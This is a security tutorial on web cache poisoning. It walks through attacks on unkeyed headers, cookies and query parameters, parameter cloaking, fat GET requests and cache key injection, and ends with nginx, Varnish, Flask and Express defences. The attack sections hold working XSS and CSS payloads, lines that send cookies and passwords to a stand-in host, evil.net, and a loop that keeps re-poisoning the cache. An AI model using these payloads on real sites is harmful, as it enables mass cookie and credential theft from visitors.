# Web Cache Poisoning

Web cache poisoning transforms a cache from a performance feature into a mass-distribution mechanism for attacks — the attacker injects a malicious payload once and it propagates automatically to every user whose request hits the poisoned cache entry, turning a reflected vulnerability into an effectively stored one across an entire user population. The fundamental danger is asymmetric: exploiting a single unkeyed header or a single parsing discrepancy between cache and application can result in thousands of users receiving JavaScript payloads, malicious redirects, or injected resource imports without any further attacker interaction. The scope of impact scales directly with the popularity of the poisoned page, meaning the home page of a high-traffic site is the highest-value target imaginable.

**Fundamental principle: A cache serves identical responses to all users who share the same cache key — so any input the server uses to generate a response that is NOT included in the cache key is an unkeyed input, and an attacker who controls an unkeyed input can poison the cached response for every other user who shares that key.**

***

## How Web Caches Work

Before attacking, you need to understand how the cache decides what to serve.

```
Cache architecture — request flow:
─────────────────────────────────────────────────────────────────────────────

               [HTTP Request]
                     │
                     ▼
         ┌─────────────────────┐
         │     Web Cache       │  ← CDN (Cloudflare, Akamai, Fastly)
         │  (reverse proxy)    │    or server-level cache (Varnish, Nginx)
         └─────────────────────┘
           │              │
    CACHE HIT          CACHE MISS
           │              │
           ▼              ▼
    Return cached    Forward to back-end
    response         server
    (no back-end     │
     involved)       ▼
                Back-end generates
                response
                     │
                     ▼
             Cache stores response
             with its CACHE KEY
                     │
                     ▼
             Return response to user

─────────────────────────────────────────────────────────────────────────────
CACHE KEY — the subset of request components used to identify "equivalent" requests

Default cache key (typical):
  ✓ Request line (method + path + query string)
  ✓ Host header

NOT in cache key by default (unkeyed):
  ✗ X-Forwarded-Host
  ✗ X-Forwarded-Scheme / X-Forwarded-Proto
  ✗ X-Original-URL
  ✗ Cookie header (in many configs)
  ✗ Accept-Language
  ✗ User-Agent (sometimes)
  ✗ Request body (in almost all GET caches)
  ✗ UTM / analytics query parameters (utm_source, utm_content, etc.)

KEY INSIGHT: The cache ignores unkeyed inputs when matching requests.
The server DOES use them to build the response.
An attacker who injects a payload into an unkeyed input gets it into the
cached response — which is then served to ALL users who share the cache key.
```

### Cache Response Indicators

```
# Response headers that reveal cache behaviour — essential for testing:
──────────────────────────────────────────────────────────────────────────────

X-Cache: miss          → response came from back-end (was NOT cached)
X-Cache: hit           → response came from cache (NO back-end involved)
X-Cache: hit           ← after multiple requests with same key → confirms caching

Age: 174               → response has been cached for 174 seconds
Cache-Control: public, max-age=1800  → cacheable for 30 minutes
Cache-Control: private → NOT cacheable by shared caches (CDN won't cache)
Cache-Control: no-store → explicitly excluded from caching
Vary: User-Agent       → User-Agent is ADDED to the cache key for this response

Via: 1.1 varnish-v4   → Varnish is being used as the cache layer
CF-Cache-Status: HIT   → Cloudflare cache hit
X-Drupal-Cache: HIT    → application-level Drupal cache hit

# Timing oracle (when no cache headers are present):
# Send the same request twice rapidly.
# If the second response is ~10–50ms vs ~300–1000ms → cache hit vs back-end call
```

***

## Attack Methodology

```
Web cache poisoning attack workflow:
─────────────────────────────────────────────────────────────────────────────
STEP 1: IDENTIFY A CACHE ORACLE
  ↓  Find a page that:
  ↓    - Is cacheable (Cache-Control: public / no explicit no-store)
  ↓    - Gives feedback on cache state (X-Cache header, timing, visible content)
  ↓    - Reflects some input in the response (URL, headers, cookies)

STEP 2: ADD A CACHE BUSTER TO ALL TEST REQUESTS
  ↓  Ensures your test requests don't poison the cache for real users
  ↓  Ensures you always get a fresh response from the back-end
  ↓  Use a unique parameter:  GET /?cb=UNIQUESTRING
  ↓  Or a keyed header value: Origin: cachebuster-12345.example.com

STEP 3: IDENTIFY UNKEYED INPUTS
  ↓  Add candidate headers one at a time → check if response changes
  ↓  Use Param Miner (Burp extension) to automate header discovery
  ↓  Confirm unkeyed: inject value → see it reflected → remove header
  ↓    → if cached response still reflects your value → it's unkeyed

STEP 4: ELICIT A HARMFUL RESPONSE
  ↓  Craft a payload using the unkeyed input
  ↓  Goal: get server to return a response containing dangerous content
  ↓  (XSS payload, malicious resource URL, harmful redirect, etc.)

STEP 5: GET THE RESPONSE CACHED
  ↓  Remove the cache buster from the request
  ↓  Send the malicious request repeatedly until X-Cache: hit
  ↓  The cached entry now contains your payload

STEP 6: VERIFY DELIVERY TO VICTIMS
  ↓  Visit the URL in a clean browser (no attacker headers)
  ↓  Confirm the poisoned response is served without injecting anything
  ↓  Script to re-poison on TTL expiry: loop sending payload every N seconds
─────────────────────────────────────────────────────────────────────────────
```

***

## Phase 1: Identifying Unkeyed Inputs

### Manual Detection

```http
# ── METHODOLOGY: Confirm a header is unkeyed ─────────────────────────────────

# Step 1: Baseline request with cache buster — note response content
GET /?cb=abc123 HTTP/1.1
Host: target.com
# Response: <script src="/static/analytics.js"></script>

# Step 2: Inject a test value in candidate header
GET /?cb=abc123 HTTP/1.1
Host: target.com
X-Forwarded-Host: TESTVALUE12345
# Response: <script src="https://TESTVALUE12345/static/analytics.js"></script>
#                                   ↑ server reflected the unkeyed header in response

# Step 3: Confirm it's unkeyed — request without the header, check cache response
GET /?cb=abc123 HTTP/1.1
Host: target.com
# (no X-Forwarded-Host header)
# Response: <script src="https://TESTVALUE12345/static/analytics.js"></script>
#           ↑ still contains TESTVALUE12345 → served from cache → UNKEYED CONFIRMED

# Candidate unkeyed headers to probe:
X-Forwarded-Host: test
X-Forwarded-Scheme: http
X-Forwarded-Proto: http
X-Original-URL: /test
X-Rewrite-URL: /test
X-Host: test
X-Forwarded-Server: test
X-Forwarded-For: test
X-Real-IP: test
X-Custom-IP-Authorization: test
X-Forwarded-Port: 1337
X-Original-Host: test
```

### Using Param Miner

```
# ── PARAM MINER — automated unkeyed input discovery ──────────────────────────
# Burp Extension: BApp Store → "Param Miner"

# Setup:
# 1. Capture the target request in Burp Proxy
# 2. Right-click the request → Extensions → Param Miner → Guess headers
# 3. In the options dialog:
#      ✓ Add dynamic cache buster    ← prevents poisoning real users
#      ✓ Add static cache buster
#      ✓ Include cache busters in headers
#      ✓ Guess param names
# 4. Click OK — Param Miner runs in background

# Output locations:
#   Burp Suite Professional: Dashboard → Issues pane
#   Burp Suite Community:    Extensions → Installed → Param Miner → Output tab

# Example Param Miner finding:
# [*] Found issue: Reflected unkeyed header on home page
#     URL: https://target.com/
#     Header: X-Forwarded-Host
#     Evidence: header value reflected in <script src> attribute

# ── ALTERNATIVE CACHE BUSTERS when query string is unkeyed ───────────────────
# If the entire query string is unkeyed, ?cb=xxx won't distinguish requests.
# Use keyed headers as busters instead:

Accept-Encoding: gzip, deflate, cachebuster-abc123    ← non-standard encoding value
Accept: */*, text/cachebuster-abc123
Origin: https://cachebuster-abc123.vulnerable-website.com

# Also try path-based busters (framework-specific, cache sees different key,
# back-end normalises to same route):
# Apache:  GET //          → same as GET /
# Nginx:   GET /%2F        → same as GET /
# PHP:     GET /index.php/xyz  → same as GET /
# .NET:    GET /(A(xyz)/   → same as GET /
```

***

## Phase 2: Exploiting Design Flaws

### Cache Poisoning → XSS via Unkeyed Header

```http
# ── SCENARIO: X-Forwarded-Host reflected in <script src> ─────────────────────

# STEP 1: Baseline — understand how header is used
GET / HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: test.com

# Response body contains:
# <script src="https://test.com/resources/js/tracking.js"></script>
#                ↑ X-Forwarded-Host value reflected verbatim in src attribute

# STEP 2: Host attacker's JavaScript file
# On attacker server at https://evil.net/resources/js/tracking.js:
# document.location='https://evil.net/steal?c='+document.cookie

# STEP 3: Poison the cache (remove cache buster — target the real page)
GET / HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: evil.net

# Response:
# HTTP/1.1 200 OK
# X-Cache: miss
# <script src="https://evil.net/resources/js/tracking.js"></script>
#                ↑ malicious URL in response

# STEP 4: Re-send until X-Cache: hit — cache is now poisoned
GET / HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: evil.net
# Response: X-Cache: hit
# Cache entry now contains the malicious script import

# STEP 5: Victim visits https://vulnerable-website.com/ — no special headers
# → Cache serves poisoned response
# → Browser loads evil.net/resources/js/tracking.js
# → Attacker's JS executes → cookie theft, credential harvesting, etc.
# → Every subsequent visitor receives the attack until cache TTL expires

# STEP 6: Keep re-poisoning before TTL expires (automate):
while True:
    requests.get('https://vulnerable-website.com/',
                 headers={'X-Forwarded-Host': 'evil.net'})
    time.sleep(25)   # cache TTL is 30s; re-poison every 25s


# ── SCENARIO: X-Forwarded-Host reflected in Open Graph meta tag ──────────────

GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(document.cookie)</script>

# Response:
# <meta property="og:image"
#       content="https://a."><script>alert(document.cookie)</script>"/cms/social.png"/>
#                              ↑ XSS breaks out of attribute into HTML context
```

### Cache Poisoning via Unkeyed Cookie

```http
# ── SCENARIO: Language cookie unkeyed, reflected in cacheable response ────────

GET /blog/post.php?mobile=1 HTTP/1.1
Host: innocent-website.com
Cookie: language=pl

# Response (Polish version returned and cached):
# HTTP/1.1 200 OK
# Cache-Control: public
# Content-Language: pl
# [Polish page content]

# Cache key = /blog/post.php?mobile=1 (Host + path + query)
# Cookie is NOT in the cache key
# → All subsequent users requesting /blog/post.php?mobile=1 get the Polish version

# Exploitation variant — inject XSS into cookie value:
GET /blog/post.php?mobile=1 HTTP/1.1
Host: innocent-website.com
Cookie: fehost=evil-user.net

# If the fehost cookie is reflected in the response:
# <script>window.__INITIALDATA__ = {"server": "evil-user.net"};</script>
# → Cache poisoned with attacker-controlled JS context data


# ── CONFIRMATION TECHNIQUE: Distinguish cookie-based caching ─────────────────

# Send two requests with different cookie values, same URL:
# Request 1: Cookie: lang=en → cache MISS → response in English
# Request 2: Cookie: lang=pl → cache MISS → response in Polish

# Now, send request without any Cookie header:
# → If you receive the Polish version (lang=pl) → cookie is unkeyed
# → Cache served the last-cached response regardless of cookie value
```

### Cache Poisoning via Multiple Unkeyed Headers

```http
# ── SCENARIO: X-Forwarded-Scheme + X-Forwarded-Host chained attack ───────────

# Context: site enforces HTTPS redirects using X-Forwarded-Scheme header
GET /random HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http

# Response:
# HTTP/1.1 301 Moved Permanently
# Location: https://innocent-site.com/random
# ↑ Redirect — but where?  X-Forwarded-Host controls the hostname in the redirect

# Chain both headers:
GET / HTTP/1.1
Host: innocent-site.com
X-Forwarded-Scheme: http           ← triggers redirect response
X-Forwarded-Host: evil-net         ← controls the redirect destination

# Response:
# HTTP/1.1 301 Moved Permanently
# Location: https://evil-net/       ← open redirect to attacker's domain
# X-Cache: miss

# Once cached: every visitor to / is redirected to https://evil-net/
# → phishing page, credential harvesting, drive-by malware

# Re-send until X-Cache: hit → cache poisoned with malicious redirect
```

### DOM-Based Attacks via Poisoned JSON / CSS Imports

```http
# ── SCENARIO: Poisoned JSON resource feeds a DOM sink ─────────────────────────

# Normal behaviour: page imports JSON from CDN, processes it client-side:
# <script>
#   fetch('/static/data.json')
#     .then(r => r.json())
#     .then(d => document.getElementById('msg').innerHTML = d.message);
#                                                ↑ innerHTML — DOM XSS sink
# </script>

# Attacker poisons /static/data.json cache entry via unkeyed header:
GET /static/data.json HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.net

# Server fetches data.json from evil.net and caches it.
# Attacker's data.json:
# {"message": "<img src=x onerror=fetch('https://evil.net/steal?c='+document.cookie)>"}

# When any user visits the page:
# → cached data.json is loaded
# → innerHTML inserts attacker's HTML
# → XSS fires → cookie exfiltration ✓


# ── SCENARIO: Poisoned CSS resource ──────────────────────────────────────────

# Some pages reflect query strings inside CSS resource files:
GET /style.css?utm_content=abc HTTP/1.1
Host: target.com

# Response:
# @import url('/site/home/index.css?utm_content=abc');

# Attacker injects CSS payload via excluded utm_content parameter:
GET /style.css?utm_content=123);@import+url('https://evil.net/malicious.css');// HTTP/1.1
Host: target.com

# Response (cached):
# @import url('/site/home/index.css?utm_content=123);
# @import url('https://evil.net/malicious.css');//');

# Malicious CSS from attacker:
# input[type=password][value^=a] { background: url('https://evil.net/steal?p=a'); }
# → CSS-based credential exfiltration ✓
```

***

## Phase 3: Exploiting Implementation Flaws

Implementation flaws occur when the cache transforms, normalises, or strips parts of the request — creating discrepancies between what the cache keys and what the server receives.

### Unkeyed Query String

```
# ── DETECTING AN UNKEYED QUERY STRING ────────────────────────────────────────

# Normal cache buster (?cb=xxx) stops working → parameter doesn't change cache key
# → The entire query string may be excluded from the cache key

# TEST: Send two requests with different parameters, check if second hits cache
Request 1: GET /?abc=1  → X-Cache: miss
Request 2: GET /?def=2  → X-Cache: HIT  (despite different query param)
#                           ↑ query string is NOT part of the cache key

# IMPLICATION: A reflected XSS vulnerability in any query parameter is now
# exploitable via cache poisoning — victim just needs to visit the base URL,
# not a crafted URL with the XSS in it.

# Detect unkeyed query string with cache buster in a keyed header:
GET /?xss=<script>alert(1)</script> HTTP/1.1
Host: target.com
Origin: cachebuster-UNIQUEVALUE.target.com   ← keyed by cache, changes cache key

# Once confirmed → remove Origin cachebuster → poison the real cache entry:
GET /?xss=<script>alert(1)</script> HTTP/1.1
Host: target.com
# X-Cache: hit → poisoned

# Victim visits:  https://target.com/
# No XSS in their URL — but cache serves the poisoned response → XSS fires
```

### Unkeyed Query Parameters

```
# ── SCENARIO: utm_content excluded from cache key ────────────────────────────

# Website excludes UTM tracking parameters from cache key.
# But those parameters are reflected in the page response without sanitisation.

# Detect excluded parameters — check if adding utm_* changes response but not cache key:
GET /?utm_content=abc HTTP/1.1     → X-Cache: miss  (back-end reflects utm_content)
GET /?utm_content=xyz HTTP/1.1     → X-Cache: HIT   (same cached entry served)
#                                     ↑ utm_content is excluded from cache key

# Confirm reflection in the response:
GET /?utm_content=CANARY HTTP/1.1
# Response: <link href="/?utm_content=CANARY" rel="canonical" />
#                           ↑ value is reflected

# Craft XSS payload using the excluded parameter:
GET /?utm_content='/><script>alert(document.cookie)</script> HTTP/1.1
Host: target.com
# Response reflects:
# <link href="/?utm_content='/><script>alert(document.cookie)</script>" />
# X-Cache: miss → re-send until → X-Cache: hit

# Victim visits https://target.com/ with no special parameters
# → Cache serves poisoned response → XSS fires ✓
```

### Cache Parameter Cloaking

```
# ── TECHNIQUE 1: Double-question-mark injection ──────────────────────────────

# Scenario: cache excludes parameters it considers "second parameters" after ?
# Back-end only treats the first ? as the parameter delimiter.

# URL sent:
GET /?example=123?excluded_param=bad-stuff-here HTTP/1.1

# Cache sees:          two parameters:
#   example = 123
#   excluded_param = bad-stuff-here   ← cache excludes this, keys only on ?example=123

# Back-end sees:       one parameter:
#   example = 123?excluded_param=bad-stuff-here   ← entire string as the value

# If 'example' passes into a useful gadget → payload injected, cache key clean ✓


# ── TECHNIQUE 2: Ruby on Rails semicolon delimiter override ──────────────────

# Rails treats both & and ; as parameter delimiters.
# Many caches only use & as a delimiter.

# URL sent:
GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here HTTP/1.1

# Cache parses with & only → sees:
#   keyed_param = abc                             ← keyed (included in cache key)
#   excluded_param = 123;keyed_param=bad-stuff-here ← excluded (not in cache key)
#
# Cache key: /?keyed_param=abc   ← CLEAN, matches legitimate user requests

# Rails parses with both & and ; → sees three parameters:
#   keyed_param = abc
#   excluded_param = 123
#   keyed_param = bad-stuff-here   ← duplicate; Rails uses LAST occurrence
#
# Rails passes keyed_param = bad-stuff-here to the application ← POISONED VALUE

# If keyed_param controls a JSONP callback:
GET /jsonp?callback=legit&excluded=x;callback=alert(1) HTTP/1.1

# Cache key: /jsonp?callback=legit   ← maps to all users calling /jsonp?callback=legit
# Back-end:  callback = alert(1)     ← executes attacker's function

# Response (cached):
# alert(1)({"data": "..."});          ← XSS ✓
```

### Fat GET Requests

```http
# ── TECHNIQUE: Request body in a GET request poisons cache ───────────────────

# Cache keys only on the request line (GET / HTTP/1.1) → request body is unkeyed.
# Some back-ends accept GET requests with a body and give body params precedence.

# Attacker sends:
GET /?param=innocent HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

param=<script>alert(1)</script>

# Cache key:    /?param=innocent   ← matches normal user requests ✓
# Back-end sees: param=<script>alert(1)</script>  (body takes precedence) ← poisoned
# Cache stores poisoned response under the clean key

# Victims visit /?param=innocent → receive cached XSS payload ✓


# ── X-HTTP-Method-Override variant (when body-GET is rejected) ────────────────

# Some applications won't read GET body unless overridden to POST behaviour:
GET /?param=innocent HTTP/1.1
Host: vulnerable-website.com
X-HTTP-Method-Override: POST        ← if this header is unkeyed, it's safe for cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

param=<script>alert(1)</script>

# If X-HTTP-Method-Override is unkeyed:
# Cache key: GET /?param=innocent  (unchanged)
# Back-end: treats as POST, reads body → param=<script>...
# Cache poisoned ✓
```

### Normalised Cache Keys

```
# ── TECHNIQUE: Cache normalises encoded characters in key ────────────────────

# Problem: Attacker sends XSS payload in URL → browser URL-encodes it before
# sending → server receives URL-encoded string → not executed as XSS.
#
# BUT: if the cache normalises the cache key (decodes %22 → ", %3e → >, etc.)
# then two requests produce the SAME cache key:
#
#   Request A (attacker, via Burp — raw bytes):
#     GET /example?param="><script>alert(1)</script> HTTP/1.1
#     Cache Key (after normalisation): /example?param="><script>alert(1)</script>
#
#   Request B (victim, via browser — URL-encoded):
#     GET /example?param=%22%3e%3cscript%3ealert(1)%3c%2fscript%3e HTTP/1.1
#     Cache Key (after normalisation): /example?param="><script>alert(1)</script>
#                                      ↑ SAME as Request A after normalisation

# Exploit:
# Attacker sends raw (unencoded) XSS payload via Burp Repeater → cache stores it
# under the normalised key.
# When victim's browser sends the URL-encoded version, cache normalises the key
# → matches attacker's entry → poisoned response served → XSS fires ✓

# This converts "unexploitable" reflected XSS (where browser would encode the
# payload) into a fully exploitable stored XSS via cache poisoning.
```

### Cache Key Injection

```
# ── TECHNIQUE: Delimiter injection in keyed components ───────────────────────

# Some caches concatenate components with a delimiter (e.g. __) and don't escape it.
# Attacker injects the delimiter into a keyed component to manipulate the key.

# Target cache key format: {path}__{Origin}__
# Delimiter: __ (double underscore)

# Step 1: Poison the cache using Origin header with payload + delimiter
GET /path?param=123 HTTP/1.1
Host: target.com
Origin: '-alert(1)-'__

# Cache key generated: /path?param=123__Origin='-alert(1)-'__
# Response:
# X-Cache-Key: /path?param=123__Origin='-alert(1)-'__
# <script>…'-alert(1)-'…</script>   ← Origin value reflected in script context

# Step 2: Craft the URL that produces the SAME cache key without the Origin header:
GET /path?param=123__Origin='-alert(1)-'__ HTTP/1.1
Host: target.com
# (no Origin header)
# Cache key: /path?param=123__Origin='-alert(1)-'__ (from query string)
# → Matches the poisoned entry
# → Serves poisoned response ✓

# Victim visits the crafted URL → receives attacker's XSS payload without
# any suspicious headers or server-side injection visible in the URL ✓
```

### Internal / Application-Level Cache Poisoning

```
# ── SCENARIO: Application caches HTML fragments, not full responses ───────────

# Internal caches store FRAGMENTS rather than whole responses.
# A shared fragment (e.g. the site-wide <head> include) is poisoned once
# and served embedded in EVERY page response.
#
# There is no cache key concept for fragments → a SINGLE poisoning request
# affects ALL pages for ALL users simultaneously.

# Detection signals:
# 1. Your injected value appears in responses on MULTIPLE different pages
#    (not just the page you targeted)
# 2. Responses mix content from your last request with content from a
#    PREVIOUS request (fragment caching from different requests)
# 3. Cache behaviour is so unusual that it can't be explained by a standard
#    cache — suggests a purpose-built internal cache

# Approach:
# Use the same X-Forwarded-Host technique, but target pages that include
# a shared fragment (header, footer, global <head> include).

# Example: site includes a shared <head> fragment that imports a JS file using
# the X-Forwarded-Host header:
#   <script src="https://[X-Forwarded-Host-value]/static/app.js"></script>

# Poison once:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.net

# Result: the <head> fragment cached with evil.net script import.
# Every page on the site now loads evil.net/static/app.js ← site-wide compromise ✓

# ⚠ SAFETY WARNING: Internal caches have no traditional cache busters.
# ALWAYS use a domain you control as the payload host.
# Test conservatively — a single request can affect all real users.
```

### Timing-Based Cache Exploitation

```
# ── READING CACHE METADATA TO TIME THE ATTACK PRECISELY ─────────────────────

# A response that reveals its cache age tells the attacker exactly when
# to send the poisoning request for maximum efficiency:

HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174                  ← cached response is 174 seconds old
Cache-Control: public, max-age=1800   ← TTL is 1800 seconds (30 minutes)

# Remaining cache lifetime: 1800 - 174 = 1626 seconds
# Attacker waits until the cache entry is about to expire, then sends
# the poisoning request in the window between expiry and re-caching:
#
#  t = 1626s: cache expires → next user request hits back-end
#  t = 1627s: attacker sends poisoning request → response stored in cache
#  All subsequent users for the next 1800s receive the poisoned response
#
# This is stealthy — only one poisoning request is sent rather than a flood.

# Akamai: expose cache key directly using debug header:
GET /?param=1 HTTP/1.1
Host: target.com
Pragma: akamai-x-get-cache-key

# Response:
# X-Cache-Key: target.com/?param=1
# → Reveals exactly what is and isn't in the cache key for this CDN config
```

***

## Defences: Preventing Web Cache Poisoning

### Header and Input Controls

```
# ── NGINX: Strip dangerous unkeyed headers before they reach the back-end ─────

# /etc/nginx/nginx.conf or server block

server {
    # ✓ Strip headers that should never be passed to the application
    # but might be used to generate dynamic responses if they reach it

    proxy_set_header X-Forwarded-Host   $host;        # Override with real host
    proxy_set_header X-Forwarded-Proto  $scheme;      # Override with real scheme
    proxy_set_header X-Forwarded-For    $remote_addr; # Real client IP only

    # ✓ Remove headers that the application should NEVER receive from clients:
    proxy_set_header X-Original-URL     "";
    proxy_set_header X-Rewrite-URL      "";
    proxy_set_header X-Host             "";
    proxy_set_header X-Forwarded-Server "";

    # ✓ Do not forward the request body on GET requests (prevents fat GET):
    # Note: enforced at WAF layer or application layer
}


# ── Varnish VCL: Add unkeyed headers to cache key ────────────────────────────

sub vcl_hash {
    hash_data(req.url);
    hash_data(req.http.Host);

    # ✓ If X-Forwarded-Proto is used by the app to generate responses,
    #   add it to the cache key so different values produce different cache entries
    if (req.http.X-Forwarded-Proto) {
        hash_data(req.http.X-Forwarded-Proto);
    }

    return (lookup);
}

# ✓ Alternative: strip the header entirely so app can't use it:
sub vcl_recv {
    unset req.http.X-Forwarded-Host;    # app never sees it → can't reflect it
    unset req.http.X-Original-URL;
}
```

### Application-Level Fixes

```python
# ── Python / Flask: Don't use request headers to generate URLs ───────────────

from flask import Flask, request, url_for
app = Flask(__name__)

# ✗ VULNERABLE: using X-Forwarded-Host to build resource URLs
@app.route('/')
def index_vulnerable():
    host = request.headers.get('X-Forwarded-Host', request.host)
    js_url = f"https://{host}/static/analytics.js"  # ← unkeyed header controls URL
    return f'<script src="{js_url}"></script>'

# ✓ SECURE: use only the configured, trusted hostname
from flask import current_app

@app.route('/')
def index_secure():
    # Use SERVER_NAME from app config — never trust request headers for URL gen
    trusted_host = current_app.config.get('SERVER_NAME', 'mysite.com')
    js_url = f"https://{trusted_host}/static/analytics.js"  # ← fixed
    return f'<script src="{js_url}"></script>'

# ✓ EVEN BETTER: use url_for with _external=True (uses SERVER_NAME from config)
@app.route('/')
def index_best():
    js_url = url_for('static', filename='analytics.js', _external=True)
    return f'<script src="{js_url}"></script>'


# ── Node.js / Express: Explicit host trust configuration ─────────────────────

const express = require('express');
const app = express();

// ✗ VULNERABLE: trust all proxy headers
app.set('trust proxy', true);   // ← any X-Forwarded-* header accepted
app.get('/', (req, res) => {
    // req.hostname now set by X-Forwarded-Host — attacker-controlled
    res.send(`<script src="https://${req.hostname}/js/app.js"></script>`);
});

// ✓ SECURE: trust only specific proxy IP or count
app.set('trust proxy', 1);      // ← only trust one hop (your known reverse proxy)
// OR: app.set('trust proxy', '10.0.0.1');  (trust only your specific proxy IP)

// ✓ EVEN BETTER: never use req.hostname in URL construction; use config value:
const TRUSTED_HOST = process.env.APP_HOST || 'myapp.com';
app.get('/', (req, res) => {
    res.send(`<script src="https://${TRUSTED_HOST}/js/app.js"></script>`);
});

// ✓ Reject fat GET requests (GET with a body):
app.use((req, res, next) => {
    if (req.method === 'GET' && parseInt(req.headers['content-length']) > 0) {
        return res.status(400).json({ error: 'GET requests must not have a body' });
    }
    next();
});
```

### CDN / Cache Configuration

```
# ── Cache key hardening — what to include and exclude ────────────────────────

INCLUDE in cache key (extend beyond defaults if app uses them):
  ✓ request line (path + query string) — always
  ✓ Host header — always
  ✓ X-Forwarded-Proto / scheme — if app generates different content for HTTP vs HTTPS
  ✓ Accept-Language — if app serves language-specific content
  ✓ User-Agent — if app serves different content to mobile vs desktop

NEVER leave these unkeyed if the app uses them in response generation:
  ✗ X-Forwarded-Host (unless you strip it before it reaches the app)
  ✗ X-Forwarded-For (never use for content generation)
  ✗ Cookie (if cookie values appear in cached responses)
  ✗ Vary header on irrelevant dimensions (leaks behaviour info to attackers)

RESTRICT caching to truly static content only:
  ✓ Cache: .js, .css, .png, .jpg, .woff (file extension based)
  ✓ Cache: responses with Cache-Control: public and no user-personalised content
  ✗ Never cache: responses containing user session data, personalised content,
    or any output derived from request headers beyond Host + path

# ── Cloudflare: Cache Rule hardening ─────────────────────────────────────────
# Rules → Cache Rules → Create rule
# Condition: URI path does NOT match /static/*
# Action: Cache Level: Bypass   ← don't cache dynamic pages at CDN level

# ── Varnish: Disable fat GET ──────────────────────────────────────────────────
sub vcl_recv {
    if (req.method == "GET" && req.http.Content-Length) {
        return (synth(400, "GET requests must not have a body"));
    }
}

# ── General: Remove dangerous supported headers at CDN/WAF level ──────────────
# Disable or remove support for these in your CDN settings if the app doesn't need them:
#   X-Original-URL
#   X-Rewrite-URL
#   X-Forwarded-Server
#   X-HTTP-Method-Override
# Every header listed above has been used in real-world cache poisoning attacks.
```
